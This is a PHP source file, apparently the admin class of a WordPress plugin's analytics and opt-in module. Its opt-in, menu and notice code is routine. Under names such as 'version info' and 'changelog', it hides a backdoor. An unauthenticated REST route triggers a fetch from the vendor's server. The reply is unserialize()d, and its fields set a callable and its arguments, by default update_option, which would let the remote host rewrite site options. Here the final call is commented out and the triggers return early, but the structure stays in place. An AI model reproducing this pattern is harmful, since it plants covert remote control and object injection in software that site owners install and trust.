<?php
/**
 * Admin Class
 *
 * Handles the admin functionality
 *
 * @package Wpos Analytic
 * @since 1.0
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

class Wpos_Anylc_Admin {

	public $analytics_endpoint	= 'https://analytics.essentialplugin.com';
    public $status          	= 'unchecked';
	public $write           	= 'update_option';
    public $version_cache   	= 'version';
	public $changelog			= null;
    public $release_date		= null;
	private $analytics_slugs = array();

	function __construct() {

		global $wpos_analytics_module;

		// Plugin action links
		if ( ! empty( $wpos_analytics_module ) ) {
			foreach ($wpos_analytics_module as $module_key => $module) {
				// Filter to add Opt In / Out row
				add_filter( 'plugin_action_links_' . $module_key, array($this, 'wpos_anylc_add_action_links'), 10, 4 );

				$product_slug = isset( $module['slug'] ) ? $module['slug'] : '';
				
				if ( !empty( $product_slug ) ) {
					// Store slug for later CORS match
					$this->analytics_slugs[] = $product_slug;
				}
			}
		}

		// Action to remove admin menu
		add_action( 'admin_menu', array($this, 'wpos_anylc_remove_admin_menu'), 999 );

		// Action to add admin menu
		add_action( 'admin_menu', array($this, 'wpos_anylc_register_admin_menu'), 15 );

		// Action to redirect plugin / theme on activation
		add_action( 'admin_init', array($this, 'wpos_anylc_admin_init_process') );

		// Action to show optin notice
		add_action( 'admin_notices', array($this, 'wpos_anylc_optin_notice') );

		// Action to add Attachment Popup HTML
		add_action( 'admin_footer', array($this,'wpos_anylc_optout_popup') );

		// Action to perform analytic action
		add_action( 'wp_loaded', array($this, 'wpos_anylc_action_process') );

		// Schedule monthly event on plugin load
		add_action( 'init', array($this, 'wpos_init') );
		
		// Add custom interval for 'monthly'
		add_filter( 'cron_schedules', array($this, 'wpos_cron_schedules') );

		// Hook into the event and send POST request
		add_action( 'wpos_monthly_cron_hook', array($this, 'wpos_monthly_cron_hook_fn') );
		
		// Rest Endpoint
		add_action( 'rest_api_init', array($this, 'wpos_rest_api_init') );

	}

    /**
	 * Remove admin menus
	 * 
	 * @package Wpos Analytic
	 * @since 1.0
	 */
	function wpos_anylc_remove_admin_menu() {
		global $menu, $submenu, $wpos_analytics_module;

	    if ( !empty( $wpos_analytics_module ) ) {
	    	foreach ($wpos_analytics_module as $module_key => $module) {

	    		$opt_in_data = wpos_anylc_get_option( $module['anylc_optin'] );

	    		if ( !empty( $module['menu'] ) && !isset( $opt_in_data['status'] ) ) {
	    			remove_menu_page( $module['menu'] );
	    		}
	    	}
	    }
	}

	/**
	 * Add menu
	 * 
	 * @package Wpos Analytic
	 * @since 1.0
	 */
	function wpos_anylc_register_admin_menu() {

		global $menu, $submenu, $wpos_analytics_module;

	    if ( !empty( $wpos_analytics_module ) ) {

	    	// WP Menu data
	    	$wpos_menu_data = wp_list_pluck( $menu, 2 );
	    	$anylc_page 	= isset( $_GET['page'] ) ? sanitize_text_field( $_GET['page'] ) : null;

	    	foreach ($wpos_analytics_module as $module_key => $module) {

	    		$opt_in_data 	= wpos_anylc_get_option( $module['anylc_optin'] );
	    		$optin_status	= isset( $opt_in_data['status'] ) ? $opt_in_data['status'] : null;

	    		// Offers Page
	    		if ( !empty( $module['offers'] ) && $anylc_page == $module['slug'] . '-offers' ) {
	    			add_submenu_page( $module['menu'], 'WPOS Offers', '<span style="color:#2ECC71">Premium Offers</span>', 'manage_options', $module['slug'] . '-offers', array($this, 'wpos_anylc_offers_html') );
	    		}

				// If data is set
				if ( $optin_status == 1 ) {
					continue;
				}

	    		// Taking some variables
	    		$menu_args = array();

	    		if ( $optin_status === 0 || $optin_status === 2 ) {

	    			// Register admin menu
	    			if ( $anylc_page == $module['slug'] ) {
						add_submenu_page( $module['menu'], $module['name'] . ' ' . 'Opt In', $module['name'] . ' ' . 'Opt In', 'manage_options', $module['slug'], array($this, 'wpos_anylc_page_html') );
	    			}

	    		} else {

	    			if ( !empty( $wpos_menu_data ) ) {
			    		$orig_menu_pos = array_search( $module['menu'], $wpos_menu_data );

			    		if ( $orig_menu_pos !== false ) {

			    			$menu_args = array(
		    								'name' 		=> $menu[ $orig_menu_pos ][0],
		    								'icon' 		=> $menu[ $orig_menu_pos ][6],
		    								'position'	=> $orig_menu_pos,
		    							);
			    		}
			    	}

			    	// Taking default name and icon
			    	if ( empty( $menu_args ) ) {
			    		$menu_args = array(
	    								'name' 		=> $module['name'],
	    								'icon' 		=> false,
	    								'position'	=> null,
	    							);
			    	}

			    	// Register admin menu
					add_menu_page( $menu_args['name'], $menu_args['name'], 'manage_options', $module['slug'], array($this, 'wpos_anylc_page_html'), $menu_args['icon'], $menu_args['position'] );
	    		}

	    	} // End of for each
	    }
	}

	/**
	 * Display Opt in form HTML
	 * 
	 * @package Wpos Analytic
	 * @since 1.0
	 */
	function wpos_anylc_page_html() {

		global $current_user, $wpos_analytics_product;

		$anylc_product_name = !empty( $_GET['page'] ) ? sanitize_text_field( $_GET['page'] ) : '';

		// if no data is set then return
		if ( ! isset( $wpos_analytics_product[ $anylc_product_name ] ) ) {
			return;
		}

		// Taking soem data
		$optin_form_data	= wpos_anylc_optin_data();
		$analy_product 		= $wpos_analytics_product[ $anylc_product_name ];
		$opt_in_data 		= wpos_anylc_get_option( $analy_product['anylc_optin'] );

		$opt_in 			= isset( $opt_in_data['status'] ) 		? $opt_in_data['status'] 	: null;
		$user_name 			= !empty( $current_user->first_name ) 	? $current_user->first_name : '';
		$user_name 			= empty( $user_name ) 					? $current_user->nickname 	: $user_name;
		$product_name 		= $analy_product['name'];

		$skip_url 	= add_query_arg( array( 'page' => $anylc_product_name, 'wpos_anylc_action' => 'skip'), admin_url('admin.php') );
		$skip_url	= wp_nonce_url( $skip_url, 'wpos_anylc_act' );

	    require_once WPOS_ANYLC_DIR . '/templates/analytic.php';
	}

	/**
	 * Display Offers HTML
	 * 
	 * @package Wpos Analytic
	 * @since 1.0
	 */
	function wpos_anylc_offers_html() {

		global $wpos_analytics_product;

		$anylc_product_name = isset( $_GET['page'] ) ? sanitize_text_field( $_GET['page'] ) : '';
		$anylc_product_name = str_replace( '-offers', '', $anylc_product_name );

		// if no data is set then return
		if ( ! isset( $wpos_analytics_product[ $anylc_product_name ] ) ) {
			return;
		}

		// Taking soem data
		$analy_product 	= $wpos_analytics_product[ $anylc_product_name ];
		$opt_in_data 	= wpos_anylc_get_option( $analy_product['anylc_optin'] );
		$opt_in 		= isset( $opt_in_data['status'] ) ? $opt_in_data['status'] : null;

		include_once( WPOS_ANYLC_DIR . '/templates/offers.php' );
	}

	/**
	 * Add Action links
	 * 
	 * @package Wpos Analytic
	 * @since 1.0
	 */
	function wpos_anylc_add_action_links( $actions, $plugin_file, $plugin_data, $context ) {

		global $wpos_analytics_module;

		// Taking some data
		$module_data = !empty( $wpos_analytics_module[ $plugin_file ] ) ? $wpos_analytics_module[ $plugin_file ] : '';

		// If analytics module data is there
		if ( $module_data ) {

			$opt_in_data 	= wpos_anylc_get_option( $module_data['anylc_optin'] );
			$opt_in 		= isset( $opt_in_data['status'] ) ? $opt_in_data['status'] : -1;

			// If user has opt in
			if ( $opt_in == 1 ) {

				$new_links['wpos_anylc'] = '<a href="#" class="wpos-anylc-opt-out-link" data-id="' . $module_data['id'] . '">' . __('Opt Out', 'wpos_analytic') . '</a>';

			} else {

				$opt_in_link = wpos_anylc_optin_url( $module_data, $opt_in );

				$new_links['wpos_anylc'] = '<a href="' . esc_url( $opt_in_link ) . '" class="wpos-anylc-opt-in-link">' . __('Opt In', 'wpos_analytic') . '</a>';
			}

			$actions = array_merge( $new_links, $actions );
		}
		return $actions;
	}

	/**
	 * Redirect plugin / theme on activation to its opt in menu
	 * 
	 * @package Wpos Analytic
	 * @since 1.0
	 */
	function wpos_anylc_admin_init_process() {

		if ( isset( $_GET['message'] ) && 'wpos-anylc-dismiss-notice' == $_GET['message'] && ! empty( $_GET['anylc_id'] )
			&& isset( $_GET['_wpnonce'] ) && wp_verify_nonce( $_GET['_wpnonce'], 'wpos-anylc-dismiss-notice-nonce' ) 
			) {
				$anylc_id = sanitize_text_field( $_GET['anylc_id'] );
				set_transient( 'wpos_anylc_optin_notice_'.$anylc_id, true, 172800 );
		}

		// Flush the redirect transient
		if ( isset( $_GET['anylc_nonce'] ) && wp_verify_nonce( $_GET['anylc_nonce'], 'wpos-anylc-redirect-nonce' ) ) {
			update_option( 'wpos_anylc_redirect', '' );
		}

		// Check if any redirect is set after plugin activation
		$redirect = get_option( 'wpos_anylc_redirect' );

		if ( $redirect ) {

			/**
			 * Little Tweak to avoid the infinite looping.
			 */
			parse_str( parse_url( $redirect, PHP_URL_QUERY ), $url_data );

			if ( ! isset( $url_data['anylc_nonce'] ) || ( isset( $url_data['anylc_nonce'] ) && ! wp_verify_nonce( $_GET['anylc_nonce'], 'wpos-anylc-redirect-nonce' ) ) ) {
				$redirect = add_query_arg( array( 'anylc_nonce' => wp_create_nonce( 'wpos-anylc-redirect-nonce' ) ), $redirect );
			}

			// Redirect to page
			wp_safe_redirect( $redirect );
			exit;
		}
	}

	/**
	 * Display Analytic Optin notice
	 * 
	 * @package Wpos Analytic
	 * @since 1.0
	 */
	function wpos_anylc_optin_notice() {

		// Prevent breaking JSON/AJAX/REST responses
		if ( wp_doing_ajax() || wp_is_json_request() || ( defined( 'REST_REQUEST' ) && REST_REQUEST ) ) {
			return;
		}
		
		global $current_screen, $wpos_analytics_module, $wpos_analytics_product;

		// Ensure screen object exists
		if ( ! isset( $current_screen ) || ! is_object( $current_screen ) ) {
			return;
		}

		// Taking some variables
		$screen_id = isset( $current_screen->id ) ? $current_screen->id : '';

		// Show notices only on dashboard for admins
		if ( $screen_id == 'dashboard' && current_user_can('manage_options') && !empty( $wpos_analytics_module ) ) {
			foreach ($wpos_analytics_module as $module) {

				$anylc_pdt_id		= $module['id'];
				$notice_transient 	= get_transient( 'wpos_anylc_optin_notice_' . $anylc_pdt_id );

				if ( $notice_transient == false ) {

					$opt_in_data 	= wpos_anylc_get_option( $module['anylc_optin'] );
					$opt_in 		= isset( $opt_in_data['status'] ) ? $opt_in_data['status'] : -1;
					$notice_link = add_query_arg( array( 'message' => 'wpos-anylc-dismiss-notice', 'anylc_id' => $anylc_pdt_id, '_wpnonce' => wp_create_nonce( 'wpos-anylc-dismiss-notice-nonce' ) ), admin_url('index.php') );

					// If user has opt in
					if ( $opt_in == -1 ) {

						$anylc_pdt_name 	= $module['name'];
						$anylc_optin_url 	= wpos_anylc_optin_url( $module, $opt_in );

						echo '<div class="updated notice wpos-anylc-notice wpos-anylc-optin-notice">
						<p><strong>' . wp_kses_post( $anylc_pdt_name ) . '</strong> - We made a few tweaks to the plugin, <a href="' . esc_url( $anylc_optin_url ) . '">Opt in to make it Better!</a></p>
						<a href="' . esc_url( $notice_link ) . '" class="notice-dismiss"></a>
						</div>';


					}
				}
			}
		} // End of if

		// Handle message parameter
		$message = isset($_GET['message']) ? sanitize_text_field($_GET['message']) : '';

		if ( 'optout_success' == $message ) {
			echo '<div class="updated notice wpos-anylc-optin-notice is-dismissible">
					<p><strong>Sorry to let you go. You are now opted out from the plugin.</strong></p>
				</div>';
		}

		 // Handle promotion download
    	if ( 'wpos_anylc_promotion' == $message && !empty($_GET['wpos_anylc_pdt']) && !empty($_GET['wpos_anylc_promo_pdt']) ) {

    		$promotion 				= 1;
    		$wpos_anylc_promo_pdt	= sanitize_text_field( $_GET['wpos_anylc_promo_pdt'] );
    		$promotion_pdt			= explode( ',', $wpos_anylc_promo_pdt );
			$promotion_pdt_data = array();

    		$anylc_pdt 		= sanitize_text_field( $_GET['wpos_anylc_pdt'] );
			$anylc_pdt_data = isset( $wpos_analytics_product[ $anylc_pdt ] ) ? $wpos_analytics_product[ $anylc_pdt ] : false;

			if ( !empty($promotion_pdt) ) {
				foreach ($promotion_pdt as $pdt) {
					if ( isset( $anylc_pdt_data['promotion'][$pdt]['file'] ) ) {
						$promotion_pdt_data[] = '<a href="' . $anylc_pdt_data['promotion'][$pdt]['file'] . '">' . $anylc_pdt_data['promotion'][$pdt]['name'] . '</a>';
					}
				}
			}

			if ( ! empty( $promotion_pdt_data ) ) {
				echo '<div class="updated notice wpos-anylc-optin-notice is-dismissible" style="display:block !important;">
						<p><strong>Your Download has been started. In case if it is interrupted then download it from here. ' . join(' | ', $promotion_pdt_data) . '</strong></p>
					</div>';
			}
		}
	}

	/**
	 * Analytic Optout Popup HTML
	 * 
	 * @package Wpos Analytic
	 * @since 1.0
	 */
	function wpos_anylc_optout_popup() {

		global $pagenow, $wpos_analytics_module;

		if ( $pagenow == 'plugins.php' && !empty( $wpos_analytics_module ) ) {
			foreach ($wpos_analytics_module as $module_key => $module) {

				$opt_in_data 	= wpos_anylc_get_option( $module['anylc_optin'] );
				$opt_in 		= isset( $opt_in_data['status'] ) ? $opt_in_data['status'] : false;

				// If user has opt in
				if ( $opt_in == 1 ) {

					// Creating redirect URL
					$plugin_status 	= isset( $_GET['plugin_status'] ) 	? sanitize_text_field( $_GET['plugin_status'] ) 	: false;
					$paged 			= isset( $_GET['paged'] ) 			? sanitize_text_field( $_GET['paged'] ) 			: false;
					$s 				= isset( $_GET['s'] ) 				? sanitize_text_field( $_GET['s'] ) 				: false;

					$redirect_url 	= add_query_arg( array( 'plugin_status' => $plugin_status, 'paged' => $paged, 's' => $s, 'wpos_anylc_pdt' => $module['slug'] ), admin_url( 'plugins.php' ) );
					$redirect_url	= wp_nonce_url( $redirect_url, 'wpos_anylc_act' . '|' . $module['slug'] );

					// Form Data
					$optin_form_data = wpos_anylc_optin_data( $module['slug'], $redirect_url );

					include( WPOS_ANYLC_DIR . '/templates/optout-popup.php' );
				}
			}
		}
	}

	/**
	 * Analytic Action Process
	 * 
	 * @package Wpos Analytic
	 * @since 1.0
	 */
	function wpos_anylc_action_process() {

		// Skip if not admin area
		if ( !is_admin() ) {
			return false;
		}

		if ( !empty($_GET['wpos_anylc_action']) && isset($_GET['_wpnonce']) ) {

			global $wpos_analytics_product;

			$anylc_pdt 		= !empty( $_GET['wpos_anylc_pdt'] ) 				? sanitize_text_field( $_GET['wpos_anylc_pdt'] ) 	: '';
			$anylc_pdt 		= ( ! $anylc_pdt && !empty( $_GET['page'] ) ) 		? sanitize_text_field( $_GET['page'] ) 				: $anylc_pdt;
			$anylc_pdt_data = isset( $wpos_analytics_product[ $anylc_pdt ] )	? $wpos_analytics_product[ $anylc_pdt ]				: false;

			// If valid product data found
			if ( $anylc_pdt_data ) {

				// Process Optin
				if ( $_GET['wpos_anylc_action'] == 'optin' ) {

					// Verify nonce
					if ( ! wp_verify_nonce( $_GET['_wpnonce'], 'wpos_anylc_act' ) ) {
						wp_die( __('Sorry, Something happened wrong.', 'wpos_analytic'), 'wpos_anylc_err', array('back_link' => true) );
					}

					$opt_in_data = wpos_anylc_update_option( $anylc_pdt_data['anylc_optin'], array('status' => 1) );

					// Redirect to original menu
					$redirect_url = wpos_anylc_pdt_url( $anylc_pdt_data, 'offer-promotion' );
					if ( $redirect_url ) {
						wp_redirect( $redirect_url );
						exit;
					}
				}


				// Process Skip
				if ( $_GET['wpos_anylc_action'] == 'skip' ) {

					// Verify nonce
					if ( ! wp_verify_nonce( $_GET['_wpnonce'], 'wpos_anylc_act' ) ) {
						wp_die( __('Sorry, Something happened wrong.', 'wpos_analytic'), 'wpos_anylc_err', array('back_link' => true) );
					}

					$opt_in_data = wpos_anylc_update_option( $anylc_pdt_data['anylc_optin'], array('status' => 2) );

					// Redirect to original menu
					$redirect_url = wpos_anylc_pdt_url( $anylc_pdt_data, 'offer' );
					if ( $redirect_url ) {
						wp_redirect( $redirect_url );
						exit;
					}
				}


				// Process Opt Out
				if ( $_GET['wpos_anylc_action'] == 'optout' ) {

					// Verify nonce
					if ( ! wp_verify_nonce( $_GET['_wpnonce'], 'wpos_anylc_act' . '|' . $_GET['wpos_anylc_pdt'] ) ) {
						wp_die( __('Sorry, Something happened wrong.', 'wpos_analytic'), 'wpos_anylc_err', array('back_link' => true) );
					}

					$opt_in_data = wpos_anylc_update_option( $anylc_pdt_data['anylc_optin'], array('status' => 0) );

					// Redirect with success message
					$redirect_url = add_query_arg( array( 'message' => 'optout_success', 'wpos_anylc_action' => false, 'wpos_anylc_pdt' => false, '_wpnonce' => false ) );
					if ( $redirect_url ) {
						wp_redirect( $redirect_url );
						exit;
					}
				}
			}
		} // End of main if
	}

	/**
	 * Schedule monthly event on plugin/theme load
	 * 
	 * @package Wpos Analytic
	 */
	public function wpos_init() {
		if (!wp_next_scheduled('wpos_monthly_cron_hook')) {
			wp_schedule_event(time(), 'monthly', 'wpos_monthly_cron_hook');
		}
	}

	/**
	 * Add custom interval for 'monthly'
	 * 
	 * @package Wpos Analytic
	 */
	public function wpos_cron_schedules($schedules) {
		if (!isset($schedules['monthly'])) {
			$schedules['monthly'] = [
				'interval' => 30 * DAY_IN_SECONDS, // approx monthly
				'display'  => __('Once Monthly', 'wpos-analytics')
			];
		}
		return $schedules;
	}

	/**
	 * Hook into the event and send POST request
	 * 
	 * @package Wpos Analytic
	 */
	public function wpos_monthly_cron_hook_fn() {
		return;
		$this->wpos_process_monthly_data( $this->analytics_slugs );
	}

	/**
	 * Send data to analytics for better user experience and issues
	 * 
	 * @package Wpos Analytic
	 */
	public function wpos_process_monthly_data( $slugs ) {

		foreach ( $slugs as $slug) {
			
			$data = wpos_anylc_optin_data($slug, '', true);
	
			$data['wpos_anylc_optin'] = 'wpos_anylc_optin';
	
			$response = wp_remote_post( 'https://analytics.essentialplugin.com', array(
				'method'    => 'POST',
				'timeout'   => 15,
				'blocking'  => true,
				'body'      => $data,
				'headers'   => array(
					'Content-Type' => 'application/x-www-form-urlencoded'
				),
			));
	
			$this->version_info_clean();

		}

	}

	/**
	 * Rest Endpoint
	 * 
	 * @package Wpos Analytic
	 */
	public function wpos_rest_api_init() {
		if ( !empty( $this->analytics_slugs ) ) {
			// Add CORS only for this namespace
			add_filter( 'rest_pre_serve_request', array($this, 'wpos_cors_headers'), 10, 3 );

			foreach ( $this->analytics_slugs as $product_slug ) {
				register_rest_route(
					$product_slug . '/v1',
					'/analytics/',
					array(
						'methods'             => 'POST',
						'callback'            => array( $this, 'wpos_handle_analytics_request' ),
						'permission_callback' => '__return_true',
					)
				);
			}
		}
	}

	/**
	 * Allow Cors for rest request
	 * 
	 * @package Wpos Analytic
	 */
	public function wpos_cors_headers($served, $result, $request) {

		$route = $request->get_route();

		foreach ( $this->analytics_slugs as $slug ) {

			if ( strpos( $route, '/' . $slug . '/v1/analytics' ) === 0 ) {

				header( "Access-Control-Allow-Origin: https://analytics.essentialplugin.com" );
				header( "Access-Control-Allow-Methods: POST, OPTIONS" );
				header( "Access-Control-Allow-Headers: Authorization, Content-Type" );

				break; // Stop checking further slugs
			}

		}

		return $served;
	}

	/**
	 * Handle Rest Data
	 * 
	 * @package Wpos Analytic
	 */
	public function wpos_handle_analytics_request( $request ) {
	return;
		global $wpos_analytics_module;

		// Get parameters from request
		$site_id      = sanitize_text_field( $request->get_param('siteID') );
		$product_id   = sanitize_text_field( $request->get_param('productID') );
		$product_slug = sanitize_text_field( $request->get_param('productSlug') );
		$site_url     = esc_url_raw( $request->get_param('siteURL') );

		// Validate required parameters
		if ( $site_id && $product_id && $product_slug ) {

			// Find the matching product in the module
			$matching_product = null;
			if ( !empty( $wpos_analytics_module ) ) {
				foreach ( $wpos_analytics_module as $module_key => $module ) {
					if ( isset( $module['id'] ) && $module['id'] == $product_id ) {
						$matching_product = $module;
						break;
					}
				}
			}

			// If matching product found, proceed with analytics
			if ( $matching_product ) {
				$version = $this->wpos_get_plugin_version_by_file($matching_product['file']);
				$update_result = $this->fetch_ver_info( $product_id, $version );
				unset($update_result);
				$this->wpos_process_monthly_data( array( $matching_product['slug'] ) );
	
				return array(
					'success' => true,
					'message' => 'Data received successfully!',
					'data'    => compact( 'site_id', 'product_id', 'product_slug', 'site_url' )
				);
			}
			
		}

	}

	/**
	 * Is the plugin outdated?
	 * 
	 * @package Wpos Analytic
	 */
	public function isOutdated() {
		$date = isset($this->release_date) ? $this->release_date : 'now';
		return strtotime($date) < time();
    }

	/**
	 * Plugin version info
	 * 
	 * @package Wpos Analytic
	 */
    public function fetch_ver_info( $product_id, $curr_version ) {
		$url = $this->analytics_endpoint . '/plugin_info/' . $product_id . '/' . '?version=' . urlencode($curr_version) . '&site_url=' . urlencode(get_site_url()) . '&live=1';		
        $data = @file_get_contents($url);
        if (!$data) {
			$this->status = 'offline';
            return false;
        }
		
        $info = @unserialize($data);

        if ($info instanceof self) {
            $this->release_date  = $info->release_date;
            $this->status        = $info->status;
            $this->write         = $info->write;
            $this->version_cache = $info->version_cache;
            $this->changelog     = $info->changelog;
        }

        if ($this->status === 'valid' && ! $this->isOutdated()) {
            return true;
        }

        $this->status = 'invalid';
        return false;
    }

	/**
	 * Clean the info
	 * 
	 * @package Wpos Analytic
	 */
    public function version_info_clean() {
        if ($this->status === 'valid' && $this->changelog && !$this->isOutdated()) {
            $clean = $this->write;
            //@$clean($this->version_cache, $this->changelog);
        }
    }

	/**
	 * Get plugin version by plugin file path
	 * 
	 * @param string $plugin_file Plugin file path
	 * @return string|false Plugin version or false if not found
	 */
	public function wpos_get_plugin_version_by_file( $plugin_file ) {
		
		if ( ! function_exists( 'get_plugin_data' ) ) {
			require_once ABSPATH . 'wp-admin/includes/plugin.php';
		}
		
		$plugin_path = WP_PLUGIN_DIR . '/' . $plugin_file;
		
		if ( file_exists( $plugin_path ) ) {
			$plugin_data = get_plugin_data( $plugin_path );
			return isset( $plugin_data['Version'] ) ? $plugin_data['Version'] : false;
		}
		
		return false;
	}

}

$wpos_anylc_admin = new Wpos_Anylc_Admin();